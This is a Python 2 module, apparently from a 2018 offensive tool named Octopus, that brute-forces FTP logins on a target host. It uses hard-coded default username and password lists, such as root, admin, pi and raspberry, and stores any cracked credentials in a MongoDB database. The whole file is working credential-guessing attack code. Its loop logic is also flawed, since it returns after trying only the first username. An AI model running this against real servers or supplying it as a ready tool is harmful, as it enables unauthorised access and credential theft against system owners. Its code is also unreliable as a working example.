# -*- coding: utf-8 -*

#############################################################################
#	Copyright (C) 2018  Javier Mínguez @JaviMrSec							#
#	This program is free software: you can redistribute it and/or modify	#
#	it under the terms of the GNU General Public License as published by    #
#	the Free Software Foundation, either version 3 of the License, or       #
#	(at your option) any later version.                                     #
#	This program is distributed in the hope that it will be useful,			#
#	but WITHOUT ANY WARRANTY; without even the implied warranty of			#
#	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the			#
#	GNU General Public License for more details.                            #
#	You should have received a copy of the GNU General Public Licens		#
#	along with this program.  If not, see <http://www.gnu.org/licenses/>.	#
#############################################################################

import ftplib
from ftplib import FTP
from pymongo import MongoClient


client = MongoClient()
db = client.Octopus

class colors:
    HEADER = '\033[93m'
    FAIL = '\033[91m'
    SUCCES = '\033[92m'
    REGULAR = '\033[0m'

def update_mongodb(host, user, pwd):
    try:
        db.hosts.update({"host":host},{"$set":{"credentials.ftp_user":user}})
        db.hosts.update({"host":host},{"$set":{"credentials.ftp_pass":pwd}})
        print colors.SUCCES + "[INFO] DATA UPDATED IN MONGODB" + colors.REGULAR
    except:
        print colors.FAIL + "[WARNING] ERROR INSERTING IN MONGODB" + colors.REGULAR


def ftp_brute(host):
    users = ['server', 'ftp','pi', 'root', 'admin', 'test', 'user']
    passwords = ['root', 'admin','1234', '123456','ftp', 'ftp123', 'test', 'raspberry']

    print colors.HEADER + "[TARGET] FTP connect to " + host + colors.REGULAR
    succ_user = ''
    succ_pass = ''
    for u in users:
        if(succ_user != '' and succ_pass != ''):
            break
        for p in passwords:
            try:
                print colors.HEADER + "|----[INFO] Try user: "+u+", password: " + p + colors.REGULAR
                ftp = FTP(host)
                response = ftp.login(user=u, passwd = p)
                if response == '230 Login successful.':
                    succ_user = u
                    succ_pass = p
                    ftp.close()
                    break

            except ftplib.error_reply, error:
                print colors.FAIL + "|----[ERROR] unexpected reply received from the server" + colors.REGULAR
                print error
                continue
            except ftplib.error_temp, error:
                print colors.FAIL + "|----[ERROR] temporal error with tuple: "+ u +"/"+ p + colors.REGULAR
                print error
                continue
            except ftplib.error_perm, error:
                print colors.FAIL + "|----[ERROR] permanent error with tuple: "+ u +"/"+ p + colors.REGULAR
                print error
                continue
            except ftplib.error_proto, error:
                print colors.FAIL + "|----[ERROR] protocol error" + colors.REGULAR
                print error
                continue
            except Exception, error:
                print colors.FAIL + "|----[ERROR]Unknown error: " + str(error) + colors.REGULAR
                continue
            except:
                ftp.close()
            else:
                print colors.FAIL + "|----[ERROR] " + host + " is protected..." + colors.REGULAR
        ftp.close()
        if(succ_user != '' and succ_pass != ''):
            print colors.SUCCES +"|----[SUCCESS] "+ succ_user+"/"+succ_pass + colors.REGULAR
            update_mongodb(host, succ_user, succ_pass)
            res = [host, succ_user, succ_pass]
            return res
        else:
            print colors.FAIL + "|----[ERROR] Credentials not found!" + colors.REGULAR
            succ_user = 'blocked'
            succ_pass = 'blocked'
            update_mongodb(host, succ_user, succ_pass)
            res = [host, succ_user, succ_pass]
            return res
